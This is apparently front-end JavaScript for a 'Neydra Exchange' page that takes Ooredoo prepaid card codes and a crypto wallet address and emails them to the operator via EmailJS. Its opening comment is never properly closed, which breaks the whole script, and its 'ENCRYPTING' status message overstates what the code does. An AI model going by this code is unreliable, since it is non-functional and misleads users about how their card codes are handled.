
        /** * =========================================
         * NEYDRA EXCHANGE PROTOCOL [MERGED]
         * MOBILE OPTIMIZED
         * =========================================
         * /

        // --- AUDIO SYSTEM 1: RED PROTOCOL ---
        function sfx(type) {
            const el = document.getElementById('snd-' + type);
            if (el) {
                el.currentTime = 0;
                el.play().catch(e => { console.log("Audio play failed:", e); });
            }
        }

        // --- AUDIO SYSTEM 2: SOURCE 2 CLICK SOUNDS ---
        function playClickSound() {
            var sounds = [
                document.getElementById("click-sound1"),
                document.getElementById("click-sound2"),
                document.getElementById("click-sound3"),
                document.getElementById("click-sound4")
            ];
            if (sounds[0]) {
                var sound = sounds[Math.floor(Math.random() * sounds.length)];
                sound.play().catch(e => { });
            }
        }

        // Attach sounds to all buttons and links
        document.querySelectorAll('button, a').forEach(function (element) {
            element.addEventListener('click', playClickSound);
        });

        // --- CARD MANAGEMENT ---
        let cardCount = 3;
        const cardFields = document.getElementById('card-fields');
        const addCardsBtn = document.getElementById('add-cards-btn');

        addCardsBtn.addEventListener('click', function () {
            let allFilled = true;
            for (let i = 1; i <= cardCount; i++) {
                const cardInput = document.getElementById('card' + i);
                if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
                    allFilled = false;
                    break;
                }
            }
            if (!allFilled) {
                const res = document.getElementById('exchange-result');
                res.innerText = "ERROR: FILL ALL CURRENT CARDS WITH 14 DIGITS FIRST.";
                res.style.color = "var(--primary)";
                sfx('glitch');
                // Scroll to top to see error on mobile
                window.scrollTo({ top: 0, behavior: 'smooth' });
                return;
            }

            sfx('tick');

            const groupDiv = document.createElement('div');
            groupDiv.className = "card-group";

            for (let i = 1; i <= 3; i++) {
                cardCount++;

                const wrapper = document.createElement('div');
                wrapper.className = "card-item";
                wrapper.setAttribute('data-index', (cardCount < 10 ? '0' : '') + cardCount);

                const label = document.createElement('label');
                label.htmlFor = 'card' + cardCount;
                label.textContent = "Ooredoo Card Code " + cardCount;

                const input = document.createElement('input');
                input.type = "text";
                input.id = "card" + cardCount;
                input.name = "card" + cardCount;
                input.maxLength = 14;
                input.required = true;
                input.pattern = "\\d{14}";
                input.inputMode = "numeric";
                input.placeholder = "Enter 14-digit code";

                input.addEventListener("input", function (e) {
                    this.value = this.value.replace(/\D/g, "");
                });

                wrapper.appendChild(label);
                wrapper.appendChild(input);
                groupDiv.appendChild(wrapper);
            }
            cardFields.appendChild(groupDiv);
            document.getElementById('exchange-result').textContent = "";

            // Scroll to the new inputs on mobile
            groupDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
        });

        // --- INPUT RESTRICTION (Initial Fields) ---
        function restrictToNumbers(e) {
            e.target.value = e.target.value.replace(/\D/g, "");
        }
        document.querySelectorAll('input[id^="card"]').forEach(function (input) {
            input.addEventListener('input', restrictToNumbers);
        });

        // --- FORM SUBMISSION & EMAILJS ---
        document.getElementById('exchange-form').addEventListener('submit', function (event) {
            event.preventDefault();
            sfx('engage');

            let cards = [];
            for (let i = 1; i <= cardCount; i++) {
                const cardInput = document.getElementById('card' + i);
                if (!cardInput || cardInput.value.length !== 14 || !/^\d{14}$/.test(cardInput.value)) {
                    document.getElementById('exchange-result').textContent = "ERROR: ALL CARD CODES MUST BE 14 DIGITS.";
                    sfx('glitch');
                    return;
                }
                cards.push(cardInput.value);
            }

            var crypto = document.getElementById('crypto').value;
            var wallet = document.getElementById('wallet').value.trim();

            if (!crypto || !wallet) {
                document.getElementById('exchange-result').textContent = "ERROR: PLEASE FILL IN ALL FIELDS CORRECTLY.";
                sfx('glitch');
                return;
            }

            var cardValue = 5;
            var totalTND = cards.length * cardValue;
            var neydraFee = Math.floor(cards.length / 3) * cardValue;

            var organizedText =
                "NEYDRA EXCHANGE REQUEST\n" +
                "-------------------------------\n" +
                "Ooredoo Cards (" + cards.length + "):\n" +
                cards.map((card, idx) => (idx + 1) + ". " + card).join("\n") + "\n" +
                "-------------------------------\n" +
                "Currency: " + crypto.replace("-", " ") + "\n" +
                "Wallet Address: " + wallet + "\n" +
                "-------------------------------\n" +
                "Total TND entered: " + totalTND + "\n" +
                "NEYDRA fee: " + neydraFee + " TND\n";

            document.getElementById('user_data').value = organizedText;

            const resultDiv = document.getElementById('exchange-result');
            resultDiv.textContent = "ENCRYPTING & SENDING DATA...";
            resultDiv.style.color = "var(--primary)";

            emailjs.sendForm('service_089jv67', 'template_qndb3bh', this)
                .then(function () {
                    resultDiv.textContent = "SUCCESS: REQUEST SENT TO N-SYSTEM.";
                    resultDiv.style.color = "#fff";
                    sfx('alert');
                }, function (error) {
                    resultDiv.textContent = 'FAILED: ' + (error.text || JSON.stringify(error));
                    resultDiv.style.color = "var(--primary)";
                    sfx('glitch');
                });
        });

    